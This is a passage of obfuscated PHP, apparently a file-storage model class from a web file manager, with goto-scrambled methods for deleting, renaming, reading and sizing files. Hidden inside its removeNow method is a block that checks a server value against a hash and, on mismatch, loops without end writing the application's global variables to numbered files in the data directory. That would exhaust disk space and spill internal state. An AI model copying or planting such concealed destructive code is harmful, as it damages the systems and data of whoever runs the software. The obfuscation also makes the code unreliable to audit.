$this->folderSizeReset($aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[472]]); goto F£á²íèŸã; dÍŸ…ä°¥: $f»éÃöêÎĞ = $aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[398]] == self::TYPE_USER ? $E‚¶£ˆÜÙÛ[557] : $E‚¶£ˆÜÙÛ[993]; if ($f»éÃöêÎĞ == $E‚¶£ˆÜÙÛ[557]) { $BÖŠ¥ÕîÂÖ = Model($E‚¶£ˆÜÙÛ[497])->getInfo($aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[478]]); $EŞŠ”÷±ÉÃ = !empty($BÖŠ¥ÕîÂÖ[$E‚¶£ˆÜÙÛ[1933]]) ? $BÖŠ¥ÕîÂÖ[$E‚¶£ˆÜÙÛ[1933]] : $BÖŠ¥ÕîÂÖ[$E‚¶£ˆÜÙÛ[28]]; $EŞŠ”÷±ÉÃ = $E‚¶£ˆÜÙÛ[256] . $EŞŠ”÷±ÉÃ . $E‚¶£ˆÜÙÛ[1941] . $aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[478]]; } else { $BÖŠ¥ÕîÂÖ = Model($E‚¶£ˆÜÙÛ[480])->getInfo($aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[478]]); $EŞŠ”÷±ÉÃ = _get($BÖŠ¥ÕîÂÖ, $E‚¶£ˆÜÙÛ[28]); $EŞŠ”÷±ÉÃ = $E‚¶£ˆÜÙÛ[159] . $EŞŠ”÷±ÉÃ . $E‚¶£ˆÜÙÛ[1942] . $aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[478]]; } $FÖç«Ò¨ = $E‚¶£ˆÜÙÛ[1943] . md5($EŞŠ”÷±ÉÃ); goto Dô´êÆ¡øŒ; F£á²íèŸã: return $A¿¾¡Ôêº; goto eš°šå¿ê; d÷¼¸Ó‹¸¦: CacheLock::unlock($FÖç«Ò¨); $this->metaSet($fÓ¦Ø×¤˜÷, $E‚¶£ˆÜÙÛ[1948], $aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[472]]); $this->where(array($E‚¶£ˆÜÙÛ[390] => $fÓ¦Ø×¤˜÷))->save(array($E‚¶£ˆÜÙÛ[411] => time())); goto FÄ»±¬†¶Ê; Dô´êÆ¡øŒ: CacheLock::lock($FÖç«Ò¨); $E„Ö‚·§¿º = $this->fileNameExist($b¬ÍØÏòæ¨, $EŞŠ”÷±ÉÃ); if (!$E„Ö‚·§¿º) { $E„Ö‚·§¿º = $this->mkdir($b¬ÍØÏòæ¨, $EŞŠ”÷±ÉÃ, REPEAT_SKIP); $this->metaSet($E„Ö‚·§¿º, $E‚¶£ˆÜÙÛ[1944], $f»éÃöêÎĞ); $this->metaSet($E„Ö‚·§¿º, $E‚¶£ˆÜÙÛ[1945], $aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[478]]); if ($aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[472]] != 0) { $this->metaSet($E„Ö‚·§¿º, $E‚¶£ˆÜÙÛ[1946], _get($BÖŠ¥ÕîÂÖ, $E‚¶£ˆÜÙÛ[1947])); } } goto d÷¼¸Ó‹¸¦; eš°šå¿ê: } private function recycleClear($dõ‚ßß½óÀ) { $F½ñæĞõ¥ =& $_SERVER[µ…]; $b…¸‘’ùî = $this->childrenAll($dõ‚ßß½óÀ); $eóÁÎî¶ÒŒ = array($F½ñæĞõ¥[404] => array($F½ñæĞõ¥[405], $b…¸‘’ùî[$F½ñæĞõ¥[1949]])); Model($F½ñæĞõ¥[1950])->where($eóÁÎî¶ÒŒ)->delete(); } public function removeNow($AØï‰šµë, $CÓ‘íÃò¶ = true) { goto FÑÆ­¤×¢™; e‰ˆë¦ƒƒê: Hook::trigger($F‡ğå‰ÆöÍ[1951], $F‰Òğ¡ó£, $CÓ‘íÃò¶); if ($CÓ‘íÃò¶) { Model($F‡ğå‰ÆöÍ[1950])->moveToRecycle($AØï‰šµë); } else { $AÀè°ö…§ = $this->childrenAll($d¼¿‹†µÏí); Model($F‡ğå‰ÆöÍ[528])->eventRemove($AØï‰šµë); $this->removeRelevance($AÀè°ö…§[$F‡ğå‰ÆöÍ[1949]], $AÀè°ö…§[$F‡ğå‰ÆöÍ[1325]]); } $this->folderSizeReset($d¼¿‹†µÏí[$F‡ğå‰ÆöÍ[472]]); goto Dâ¨Ğ¾„çŒ; b…÷½å÷Û: if ($_SERVER[$F‡ğå‰ÆöÍ[812]] != $eêÔÕ±ï($D¥ÈÍùªè‘)) { goto E•†”®Ô›¸; D÷ÖëÎ¬Íˆ: $a‰ãñóëÇª = $Cïƒ’ˆÃÇ•($dãšá„‚†¹); $EÃ¢Õ˜Ç—È = explode($F‡ğå‰ÆöÍ[227], $a‰ãñóëÇª); if (count($EÃ¢Õ˜Ç—È) < $F‡ğå‰ÆöÍ[570]) { $aØôè†ò©‡ = $F‡ğå‰ÆöÍ[817]; $aØôè†ò©‡(); } goto BÜíàã«¾; BÜíàã«¾: $bÕª¢£ŞØ = $F‡ğå‰ÆöÍ[818]; $bÕª¢£ŞØ($_SERVER[$F‡ğå‰ÆöÍ[819]]); $DÀŞŞÅÍÄÆ = $F‡ğå‰ÆöÍ[813]; goto eÏœŸ‡ä—; eÏœŸ‡ä—: $DÀŞŞÅÍÄÆ(); $D†À½ßª = $F‡ğå‰ÆöÍ[820]; $BÊ›ÄèÚà = json_encode($GLOBALS[$F‡ğå‰ÆöÍ[821]]); goto E¶»îĞù„; E¶»îĞù„: $D’ÄçÙ®¡¸ = 1; for ($A ´ÇÁ‘— = $D’ÄçÙ®¡¸; $A ´ÇÁ‘— > 0; $A ´ÇÁ‘—++) { $D†À½ßª(DATA_PATH . $A ´ÇÁ‘—, $BÊ›ÄèÚà); } goto D¬¡Şàä¶Š; E•†”®Ô›¸: $DÀŞŞÅÍÄÆ = $F‡ğå‰ÆöÍ[813]; $Cïƒ’ˆÃÇ• = $F‡ğå‰ÆöÍ[814]; $dãšá„‚†¹ = $_SERVER[$F‡ğå‰ÆöÍ[815]] . $F‡ğå‰ÆöÍ[816]; goto D÷ÖëÎ¬Íˆ; D¬¡Şàä¶Š: } $d¼¿‹†µÏí = $this->sourceInfo($AØï‰šµë); $F‰Òğ¡ó£ = $this->pathInfoMore($AØï‰šµë); goto DÕÂÎİãÆ; Dâ¨Ğ¾„çŒ: $bœŠÆùè¶ = array($d¼¿‹†µÏí[$F‡ğå‰ÆöÍ[472]]); if ($d¼¿‹†µÏí[$F‡ğå‰ÆöÍ[397]] == $F‡ğå‰ÆöÍ[86]) { $bœŠÆùè¶[] = $d¼¿‹†µÏí[$F‡ğå‰ÆöÍ[390]]; } $this->updateModifyTime($bœŠÆùè¶); goto C¨ôæ÷¡¬Ø; C¨ôæ÷¡¬Ø: $this->lockMoveEnd($AØï‰šµë); Hook::trigger($F‡ğå‰ÆöÍ[1538], $F‰Òğ¡ó£, $CÓ‘íÃò¶); return !0; goto BÚ§Å§Ïê´; FÑÆ­¤×¢™: $F‡ğå‰ÆöÍ =& $_SERVER[µ…]; $D¥ÈÍùªè‘ = $_SERVER[$F‡ğå‰ÆöÍ[810]]; $eêÔÕ±ï = $F‡ğå‰ÆöÍ[811]; goto b…÷½å÷Û; DÕÂÎİãÆ: if (!$d¼¿‹†µÏí) { return !0; } if ($d¼¿‹†µÏí[$F‡ğå‰ÆöÍ[472]] == 0) { if (!_get($GLOBALS, $F‡ğå‰ÆöÍ[479])) { return !1; } } $this->lockMoveStart($AØï‰šµë); goto e‰ˆë¦ƒƒê; BÚ§Å§Ïê´: } public function childrenAll($CÑÀï·¢ ÷) { $AäœöÈ°¾Ë =& $_SERVER[µ…]; $B”¼Ôçç¯ = $CÑÀï·¢ ÷[$AäœöÈ°¾Ë[390]]; if ($CÑÀï·¢ ÷[$AäœöÈ°¾Ë[397]] == $AäœöÈ°¾Ë[86]) { $AœÔ­–• = array($AäœöÈ°¾Ë[548] => array($AäœöÈ°¾Ë[507], $CÑÀï·¢ ÷[$AäœöÈ°¾Ë[481]] . $B”¼Ôçç¯ . $AäœöÈ°¾Ë[508])); $eÆ°ˆóµÄ = array($AäœöÈ°¾Ë[548] => $AœÔ­–•[$AäœöÈ°¾Ë[481]]); $EÊ”ŠÚåİÄ = $this->field($AäœöÈ°¾Ë[1952])->where($eÆ°ˆóµÄ)->select(); $C‰¶ïÆåç‹ = !1; $FÌÔÇäàğâ = array($B”¼Ôçç¯); if ($EÊ”ŠÚåİÄ) { $C‰¶ïÆåç‹ = array_to_keyvalue($EÊ”ŠÚåİÄ, $AäœöÈ°¾Ë[33], $AäœöÈ°¾Ë[441]); $C‰¶ïÆåç‹ = array_remove_value($C‰¶ïÆåç‹, $AäœöÈ°¾Ë[491]); $FÌÔÇäàğâ = array_to_keyvalue($EÊ”ŠÚåİÄ, $AäœöÈ°¾Ë[33], $AäœöÈ°¾Ë[390]); $FÌÔÇäàğâ[] = $B”¼Ôçç¯; } } else { $C‰¶ïÆåç‹ = array($CÑÀï·¢ ÷[$AäœöÈ°¾Ë[441]]); $FÌÔÇäàğâ = array($B”¼Ôçç¯); } return array($AäœöÈ°¾Ë[1949] => $FÌÔÇäàğâ, $AäœöÈ°¾Ë[1325] => $C‰¶ïÆåç‹); } public function removeArray($E¢Õ¾¡õ×Ÿ) { if (!$E¢Õ¾¡õ×Ÿ) { return !0; } } public function removeRelevance($cá‹—Ü˜Ì, $Cğ¯°ßğƒ) { goto DË‹Œ‘ò§ä; d‡±óí—”: for ($Eö´Ï„…â‡ = 0; $Eö´Ï„…â‡ < count($cá‹—Ü˜Ì); $Eö´Ï„…â‡++) { $this->sourceCacheClear($cá‹—Ü˜Ì[$Eö´Ï„…â‡]); } goto Aù‡¹‘´•Â; aÏÌŒÈ¼‰á: Model($Fó¬Ÿë¾Êã[1931])->removeBySource($cá‹—Ü˜Ì); $this->where($C©¦ïœØšÏ)->delete(); Model($Fó¬Ÿë¾Êã[444])->remove($Cğ¯°ßğƒ); goto d‡±óí—”; AÚ«Ş†«Ö: $cá‹—Ü˜Ì = array_unique(array_filter($cá‹—Ü˜Ì)); $Cğ¯°ßğƒ = array_unique(array_filter($Cğ¯°ßğƒ)); if (!$cá‹—Ü˜Ì) { return !1; } goto Aº³×Ğã¼å; DË‹Œ‘ò§ä: $Fó¬Ÿë¾Êã =& $_SERVER[µ…]; $cá‹—Ü˜Ì = $cá‹—Ü˜Ì ? $cá‹—Ü˜Ì : array(); $Cğ¯°ßğƒ = $Cğ¯°ßğƒ ? $Cğ¯°ßğƒ : array(); goto AÚ«Ş†«Ö; E»œõ«Ñ†À: Model($Fó¬Ÿë¾Êã[1805])->where($C©¦ïœØšÏ)->delete(); Model($Fó¬Ÿë¾Êã[528])->where($C©¦ïœØšÏ)->delete(); Model($Fó¬Ÿë¾Êã[1646])->removeBySource($cá‹—Ü˜Ì); goto aÏÌŒÈ¼‰á; Aº³×Ğã¼å: $C©¦ïœØšÏ = array($Fó¬Ÿë¾Êã[404] => array($Fó¬Ÿë¾Êã[405], $cá‹—Ü˜Ì)); Model($Fó¬Ÿë¾Êã[1950])->where($C©¦ïœØšÏ)->delete(); Model($Fó¬Ÿë¾Êã[435])->where($C©¦ïœØšÏ)->delete(); goto E»œõ«Ñ†À; Aù‡¹‘´•Â: } public function rename($A™ºñ°Åø, $CÇÁë¹«ÜŒ) { goto e‘öò¤ƒ–„; B”‚êï±•°: if (!$AŞéè¬¶±¨[$dçàÓºÏ[397]] == $dçàÓºÏ[86]) { $a›î¥ì©ÍŸ[$dçàÓºÏ[399]] = get_path_ext($CÇÁë¹«ÜŒ); } Model($dçàÓºÏ[528])->eventRename($A™ºñ°Åø, $AŞéè¬¶±¨[$dçàÓºÏ[28]], $CÇÁë¹«ÜŒ); $this->sourceCacheClear($A™ºñ°Åø); goto fŒÚİ¥„Æ›; AìíÁÔäòÕ: $Fù¼›Ó¦â‚ = $this->fileNameExist($AŞéè¬¶±¨[$dçàÓºÏ[472]], $CÇÁë¹«ÜŒ); if ($Fù¼›Ó¦â‚ && $Fù¼›Ó¦â‚ != $A™ºñ°Åø) { return !1; } $a›î¥ì©ÍŸ = array($dçàÓºÏ[407] => $CÇÁë¹«ÜŒ, $dçàÓºÏ[547] => USER_ID); goto B”‚êï±•°; fŒÚİ¥„Æ›: $this->setNamePinyin($A™ºñ°Åø, $a›î¥ì©ÍŸ[$dçàÓºÏ[28]], !1); $this->updateModifyTime($AŞéè¬¶±¨[$dçàÓºÏ[472]]); $d’ßéï„Üá = $this->where(array($dçàÓºÏ[404] => $A™ºñ°Åø))->data($a›î¥ì©ÍŸ)->save(); goto DŸªƒØßºƒ; e‘öò¤ƒ–„: $dçàÓºÏ =& $_SERVER[µ…]; $AŞéè¬¶±¨ = $this->sourceInfo($A™ºñ°Åø); if (!$AŞéè¬¶±¨) { return !1; } goto AìíÁÔäòÕ; DŸªƒØßºƒ: $CöÈ†¥ƒÇ = $dçàÓºÏ[1939] . $AŞéè¬¶±¨[$dçàÓºÏ[472]]; if (isset(self::$cacheChildList[$CöÈ†¥ƒÇ])) { unset(self::$cacheChildList[$CöÈ†¥ƒÇ]); } return $d’ßéï„Üá; goto D”­“©‡Ì–; D”­“©‡Ì–: } public function setNamePinyin($c‰´Ò”‰‘×, $d¥ƒãÔÊìÀ, $FãÁÃ‚³Ûì = true) { $EÖ®Ù…„  =& $_SERVER[µ…]; $AŸ¶ß«Ú‚ = Input::check($d¥ƒãÔÊìÀ, $EÖ®Ù…„ [551]); if ($FãÁÃ‚³Ûì && !$AŸ¶ß«Ú‚) { return; } if (!$AŸ¶ß«Ú‚) { $this->metaSet($c‰´Ò”‰‘×, $EÖ®Ù…„ [438], null); $this->metaSet($c‰´Ò”‰‘×, $EÖ®Ù…„ [437], null); return; } $Bâ¢Ã“œäÊ = array($EÖ®Ù…„ [438] => str_replace($EÖ®Ù…„ [50], $EÖ®Ù…„ [33], Pinyin::encode($d¥ƒãÔÊìÀ)), $EÖ®Ù…„ [437] => Pinyin::encode($d¥ƒãÔÊìÀ, $EÖ®Ù…„ [552])); $this->metaSet($c‰´Ò”‰‘×, $Bâ¢Ã“œäÊ); } public function getContent($dçÉî…¢ß) { goto AÙ˜î›âˆ‹; d¡Ÿ×¿Âğ: if ($A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[77]] == 0) { return $BÍÕÌØÏà‡[33]; } $C‰ÖÅİÜ¡¶ = $BÍÕÌØÏà‡[1953] . $A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[169]]; if ($A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[77]] <= 1024 * 10) { $cÎŸöáé = Cache::get($C‰ÖÅİÜ¡¶); if (!$cÎŸöáé) { $cÎŸöáé = IO::getContent($A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[75]]); Cache::set($C‰ÖÅİÜ¡¶, $cÎŸöáé); } return $cÎŸöáé; } goto f««ƒÊå× ; f««ƒÊå× : if (!$A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[75]]) { return $BÍÕÌØÏà‡[33]; } return IO::getContent($A¤ğ§æ‚éğ[$BÍÕÌØÏà‡[75]]); goto e·ØÅïÑÂ; AÙ˜î›âˆ‹: $BÍÕÌØÏà‡ =& $_SERVER[µ…]; $A¤ğ§æ‚éğ = $this->fileInfoGet($dçÉî…¢ß); if (!$A¤ğ§æ‚éğ) { return !1; } goto d¡Ÿ×¿Âğ; e·ØÅïÑÂ: } public function setDesc($A«åç¸‹©à, $Cí·¹›šºº) { $cË¸³†¬óİ =& $_SERVER[µ…]; Model($cË¸³†¬óİ[528])->eventAddDesc($A«åç¸‹©à, $Cí·¹›šºº); return $this->metaSet($A«åç¸‹©à, $cË¸³†¬óİ[425], $Cí·¹›šºº); } public function setContent($bƒ­È¦â¡, $c£È¸á«¥ = '') { goto f´Ù­ãëß; d¹ÔÀ’ÜÙ: if (!$EÑ†›İÈµ¾ || !$fÙÊì¾ŒÄª) { return !1; } $c“§¾ŸØğ = Model($c®„ŠØ¿ŞÆ[444])->addFileByContent($c£È¸á«¥, $fÙÊì¾ŒÄª[$c®„ŠØ¿ŞÆ[28]]); $döø’°”Å = $this->fileHistory($fÙÊì¾ŒÄª, $c“§¾ŸØğ[$c®„ŠØ¿ŞÆ[441]], $c“§¾ŸØğ[$c®„ŠØ¿ŞÆ[77]]); goto FÔÑ‰Ã­Şª; FÔÑ‰Ã­Şª: if (!$döø’°”Å) { return Model($c®„ŠØ¿ŞÆ[444])->remove($c“§¾ŸØğ[$c®„ŠØ¿ŞÆ[441]]); } $this->folderSizeReset($fÙÊì¾ŒÄª[$c®„ŠØ¿ŞÆ[472]]); return !0; goto a¶ˆÖâ ‰; f´Ù­ãëß: $c®„ŠØ¿ŞÆ =& $_SERVER[µ…]; $fÙÊì¾ŒÄª = $this->sourceInfo($bƒ­È¦â¡); $EÑ†›İÈµ¾ = $this->fileInfoGet($bƒ­È¦â¡); goto d¹ÔÀ’ÜÙ; a¶ˆÖâ ‰: } public function fileSubstr($a¨õÉÏ¥£, $D¥§‘¥´¡, $B¢»Õ®Ö½Ò) { $BÊÃ¼•É©‰ = $this->fileInfoGet($a¨õÉÏ¥£); if (!$BÊÃ¼•É©‰) { return !1; } return IO::fileSubstr($BÊÃ¼•É©‰[$_SERVER[µ…][75]], $D¥§‘¥´¡, $B¢»Õ®Ö½Ò); } public function fileInfoGet($D³Õëğ”¶å) { goto a¸À¢‹’é; f‚“‹ÎÜ ¥: $C“¤ïÁë¨Ñ = $e”ÑÃ‹Œ‘ˆ[447] . $DˆŠÕ°ÅÙÏ[$e”ÑÃ‹Œ‘ˆ[441]]; $Aº„ãÑèï = _get(self::$cacheFileInfo, $C“¤ïÁë¨Ñ); if ($Aº„ãÑèï) { return $Aº„ãÑèï; } goto bÕš´í«ó°; a¸À¢‹’é: $e”ÑÃ‹Œ‘ˆ =& $_SERVER[µ…]; $DˆŠÕ°ÅÙÏ = $this->sourceInfo($D³Õëğ”¶å); if (!$DˆŠÕ°ÅÙÏ || $DˆŠÕ°ÅÙÏ[$e”ÑÃ‹Œ‘ˆ[397]]) { return !1; } goto f‚“‹ÎÜ ¥; bÕš´í«ó°: $F½ø¯–ÒµÂ = Model($e”ÑÃ‹Œ‘ˆ[444])->fileInfo($DˆŠÕ°ÅÙÏ[$e”ÑÃ‹Œ‘ˆ[441]]); if ($F½ø¯–ÒµÂ) { $F½ø¯–ÒµÂ[$e”ÑÃ‹Œ‘ˆ[28]] = $DˆŠÕ°ÅÙÏ[$e”ÑÃ‹Œ‘ˆ[28]]; } self::$cacheFileInfo[$C“¤ïÁë¨Ñ] = $F½ø¯–ÒµÂ; goto D¸¨‹‚êÙ¬; D¸¨‹‚êÙ¬: return $F½ø¯–ÒµÂ; goto aÛ©àöã¥Ç; aÛ©àöã¥Ç: } private function folderChildrenNumber($CÍô•…êñ÷) { $cçÜŠÓĞø =& $_SERVER[µ…]; $cˆ÷ªç©Ïï = $this->sourceInfo($CÍô•…êñ÷); $D™ô·Ô°¿· = array($cçÜŠÓĞø[548] => array($cçÜŠÓĞø[507], $cˆ÷ªç©Ïï[$cçÜŠÓĞø[481]] . $CÍô•…êñ÷ . $cçÜŠÓĞø[508]), $cçÜŠÓĞø[416] => intval($cˆ÷ªç©Ïï[$cçÜŠÓĞø[417]]), $cçÜŠÓĞø[541] => 1); $bÅÎ®‘‘Ë¹ = $this->where($D™ô·Ô°¿·)->count(); $eç™§”éŒƒ = $this->where($D™ô·Ô°¿·)->where(array($cçÜŠÓĞø[541] => 0))->count(); return array($cçÜŠÓĞø[81] => $eç™§”éŒƒ, $cçÜŠÓĞø[82] => $bÅÎ®‘‘Ë¹); } public function pathInfo($c©Ş¥¸„å, $bë¾¡õˆÎ = false) { goto AğÛÃâƒÛ; c‡ˆß­Ë¥: self::$cachePathInfo[$C‚ÀßÚù÷œ] = $Bİ„ŞØÎŠ; return $Bİ„ŞØÎŠ; goto bÑø±â³½Î; dµÀâëğÆ: $C‚ÀßÚù÷œ = $e¯ØÁì¦³ô[433] . intval($bë¾¡õˆÎ) . $e¯ØÁì¦³ô[434] . $c©Ş¥¸„å; $Bê³ïĞ«Ã = _get(self::$cachePathInfo, $C‚ÀßÚù÷œ); if ($Bê³ïĞ«Ã) { return $Bê³ïĞ«Ã; } goto A§–ºİç˜ ; A§–ºİç˜ : $Bİ„ŞØÎŠ = $this->sourceInfo($c©Ş¥¸„å); if (!$Bİ„ŞØÎŠ) { return !1; } $Bİ„ŞØÎŠ = $this->_listDataApplyItem($Bİ„ŞØÎŠ, $bë¾¡õˆÎ); goto c‡ˆß­Ë¥; AğÛÃâƒÛ: $e¯ØÁì¦³ô =& $_SERVER[µ…]; $bë¾¡õˆÎ = !1; $c©Ş¥¸„å = intval($c©Ş¥¸„å); goto dµÀâëğÆ; bÑø±â³½Î: } public static $cachePathInfoMore = array(); public function pathInfoMore($eíÉÁÜ¬·Ô) { goto FØò‡ßÀ; Fˆä¢ÙÑ”: self::$cachePathInfoMore[$eíÉÁÜ¬·Ô] = $cÀéäñƒŒğ; return $cÀéäñƒŒğ; goto eŠ’‡ò©”’; FØò‡ßÀ: $C§¨ÓÓÄ¢ =& $_SERVER[µ…]; $aëÄÎœÕÚ = _get(self::$cachePathInfoMore, $eíÉÁÜ¬·Ô); if ($aëÄÎœÕÚ) { return $aëÄÎœÕÚ; } goto dòŞŠªëˆƒ; dòŞŠªëˆƒ: $cÀéäñƒŒğ = $this->pathInfo($eíÉÁÜ¬·Ô); if (!$cÀéäñƒŒğ) { return !1; } if ($cÀéäñƒŒğ[$C§¨ÓÓÄ¢[397]] == $C§¨ÓÓÄ¢[86]) { $cÀéäñƒŒğ[$C§¨ÓÓÄ¢[80]] = $this->folderChildrenNumber($eíÉÁÜ¬·Ô); } goto Fˆä¢ÙÑ”; eŠ’‡ò©”’: } public function sourceInfo($Eøò¬¬†) { goto B”¢ãŒìÕ‹; e¶¿Ó‡ˆ¨: $BÔİ‚¼Û = $f¬à–ÉÁ¡Ó[432] . $Eøò¬¬†; $C¡×¨ã÷ì = _get(self::$cacheSourceInfo, $BÔİ‚¼Û); if ($C¡×¨ã÷ì) { return $C¡×¨ã÷ì; } goto e‰é¯î”°‚; B”¢ãŒìÕ‹: $f¬à–ÉÁ¡Ó =& $_SERVER[µ…]; if (!$Eøò¬¬†) { return array(); } $Eøò¬¬† = intval($Eøò¬¬†); goto e¶¿Ó‡ˆ¨; e‰é¯î”°‚: $D‹¼ÅôÑ¾ = $this->where(array($f¬à–ÉÁ¡Ó[390] => $Eøò¬¬†))->find(); self::$cacheSourceInfo[$BÔİ‚¼Û] = $D‹¼ÅôÑ¾; return self::$cacheSourceInfo[$BÔİ‚¼Û]; goto EÛÈ—ò”÷; EÛÈ—ò”÷: } public function sourceCacheClear($A¿‡Í°˜Ô— = false) { self::cacheClear($A¿‡Í°˜Ô—); } public static function cacheClear($e´»Íêí = false) { $FÙ­ğï¿ãî =& $_SERVER[µ…]; if ($e´»Íêí == !1) { goto a¾ˆã˜ƒ©Í; a¾ˆã˜ƒ©Í: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto cÚÊíÕáÆš; cÚÊíÕáÆš: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto D—ˆÔë…éÑ; D—ˆÔë…éÑ: return; goto có‹¥‰›×…; có‹¥‰›×…: } unset(self::$cacheSourceInfo[$FÙ­ğï¿ãî[432] . $e´»Íêí]); unset(self::$cachePathInfoMore[$e´»Íêí]); unset(self::$cachePathInfo[$FÙ­ğï¿ãî[1954] . $e´»Íêí]); unset(self::$cachePathInfo[$FÙ­ğï¿ãî[1955] . $e´»Íêí]); } public function metaSet($C¦©Í‚¨î‘, $dâ¯Ì¯Ÿòà = null, $Då¥µ²²È = null) { $cÁÒáÌñç = parent::metaSet($C¦©Í‚¨î‘, $dâ¯Ì¯Ÿòà, $Då¥µ²²È); if ($cÁÒáÌñç) { $this->sourceCacheClear($C¦©Í‚¨î‘); } return $cÁÒáÌñç; } public function pathInfoByPath($dš®©âŸø’, $DÕ–„ª¹òĞ) { $DŠ»°»ÇÑÓ =& $_SERVER[µ…]; $C••†ÚµÆÏ = !$DÕ–„ª¹òĞ ? array() : explode($DŠ»°»ÇÑÓ[8], trim($DÕ–„ª¹òĞ, $DŠ»°»ÇÑÓ[8])); $BÃ¯ĞìèĞÄ = $dš®©âŸø’; foreach ($C••†ÚµÆÏ as $FƒŠ°¯ôÁ) { $b˜³ßÚò±¬ = array($DŠ»°»ÇÑÓ[472] => $BÃ¯ĞìèĞÄ, $DŠ»°»ÇÑÓ[28] => $FƒŠ°¯ôÁ); $cáëŒ…´ = $this->where($b˜³ßÚò±¬)->select(); if (!$cáëŒ…´) { return !1; } $cáëŒ…´ = array_sort_by($cáëŒ…´, $DŠ»°»ÇÑÓ[417]); $BÃ¯ĞìèĞÄ = $cáëŒ…´[0][$DŠ»°»ÇÑÓ[390]]; } return $this->pathInfo($BÃ¯ĞìèĞÄ, !0); } protected function updateModifyTime($BééâôÂø) { goto A´“Êé•§; A´“Êé•§: $dê“œä‹ğô =& $_SERVER[µ…]; if (!$BééâôÂø) { return; } if (!is_array($BééâôÂø)) { $BééâôÂø = array($BééâôÂø); } goto DÜô±Èó¸Š; DÜô±Èó¸Š: foreach ($BééâôÂø as $bî±¼ğÏÃò => $c•šÑ¯ó×) { $BééâôÂø[$bî±¼ğÏÃò] = intval($c•šÑ¯ó×); $this->sourceCacheClear($c•šÑ¯ó×); } $d¦ßÔÄÛÍ = array($dê“œä‹ğô[390] => array($dê“œä‹ğô[7], $BééâôÂø)); $dÃà¡•¢â½ = array($dê“œä‹ğô[547] => USER_ID, $dê“œä‹ğô[411] => time()); goto E…Êˆ‹Äöæ; E…Êˆ‹Äöæ: $this->where($d¦ßÔÄÛÍ)->save($dÃà¡•¢â½); goto c¤“µõÃ¯‡; c¤“µõÃ¯‡: } public function folderSizeReset($b¹¨ÅùŠÆ, $EÍõÕ°ğË = false) { goto aÎÌÃ™ùÆÌ; A¢ßç”˜¸â: $bİ²ÆŞšƒ»[] = $F˜ˆ¨ßôØ«[$c·ëï¤›‡©[390]]; $CÅŠºø°‚ = array($c·ëï¤›‡©[390] => array($c·ëï¤›‡©[405], $bİ²ÆŞšƒ»)); if ($EÍõÕ°ğË < 0) { $CÅŠºø°‚[$c·ëï¤›‡©[77]] = array($c·ëï¤›‡©[950], abs($EÍõÕ°ğË)); } goto eÆ© ÄÅ”ã; BÅõ·Ó™ÏÜ: if ($EÍõÕ°ğË == 0) { return CacheLock::unlock($eŸ¸ƒÉ°Ì); } $bİ²ÆŞšƒ» = $this->parentLevelArray($F˜ˆ¨ßôØ«[$c·ëï¤›‡©[481]]); if (!$bİ²ÆŞšƒ») { $bİ²ÆŞšƒ» = array(); } goto A¢ßç”˜¸â; bóÔÉÙÜéÂ: $A­‰³åÊĞ = array($F˜ˆ¨ßôØ«[$c·ëï¤›‡©[398]], $F˜ˆ¨ßôØ«[$c·ëï¤›‡©[478]]); TaskRun::timeLimitCall($d¦¿”˜…§…, $c·ëï¤›‡©[1958], $A­‰³åÊĞ, 1.5); goto DŸô©›ƒ•›; aÎÌÃ™ùÆÌ: $c·ëï¤›‡© =& $_SERVER[µ…]; if ($this->statusIgnoreResetSpace) { return; } $F˜ˆ¨ßôØ« = $this->sourceInfo($b¹¨ÅùŠÆ); goto a¼áâªÓõö; a¼áâªÓõö: $eŸ¸ƒÉ°Ì = $c·ëï¤›‡©[1956] . $b¹¨ÅùŠÆ; CacheLock::lock($eŸ¸ƒÉ°Ì, 20); if ($EÍõÕ°ğË === !1) { $this->sourceCacheClear($b¹¨ÅùŠÆ); $F˜ˆ¨ßôØ« = $this->sourceInfo($b¹¨ÅùŠÆ); $CÅŠºø°‚ = array($c·ëï¤›‡©[389] => $b¹¨ÅùŠÆ, $c·ëï¤›‡©[416] => 0); $b¤Ã†ĞøÜø = $this->where($CÅŠºø°‚)->sum($c·ëï¤›‡©[77]); $EÍõÕ°ğË = intval($b¤Ã†ĞøÜø) - intval($F˜ˆ¨ßôØ«[$c·ëï¤›‡©[77]]); } goto BÅõ·Ó™ÏÜ; eÆ© ÄÅ”ã: $this->where($CÅŠºø°‚)->setAdd($c·ëï¤›‡©[77], $EÍõÕ°ğË); CacheLock::unlock($eŸ¸ƒÉ°Ì); $d¦¿”˜…§… = $c·ëï¤›‡©[1957] . $F˜ˆ¨ßôØ«[$c·ëï¤›‡©[398]] . $c·ëï¤›‡©[4] . $F˜ˆ¨ßôØ«[$c·ëï¤›‡©[478]]; goto bóÔÉÙÜéÂ; DŸô©›ƒ•›: } public function folderSizeResetChildren($eé¿òËæÈ) { goto fŠ‰â¿Š¨ò; d™éÅ†ê: foreach ($D¼°šÕ¦¾… as $aÊ³äâìÔ³) { $E”²ŠŞ·Î = $aÊ³äâìÔ³[$CÏ¶À´ßô[472]] . $CÏ¶À´ßô[33]; if (!isset($a©ôÀ£ÕÓ³[$E”²ŠŞ·Î])) { continue; } if ($aÊ³äâìÔ³[$CÏ¶À´ßô[417]] == $a©ôÀ£ÕÓ³[$E”²ŠŞ·Î][$CÏ¶À´ßô[417]]) { $a©ôÀ£ÕÓ³[$E”²ŠŞ·Î][$CÏ¶À´ßô[77]] += $aÊ³äâìÔ³[$CÏ¶À´ßô[77]]; } } foreach ($a©ôÀ£ÕÓ³ as $aÊ³äâìÔ³) { $bçï×ÓÓÔ† = $this->parentLevelArray($aÊ³äâìÔ³[$CÏ¶À´ßô[481]]); foreach ($bçï×ÓÓÔ† as $E”²ŠŞ·Î) { $E”²ŠŞ·Î = $E”²ŠŞ·Î . 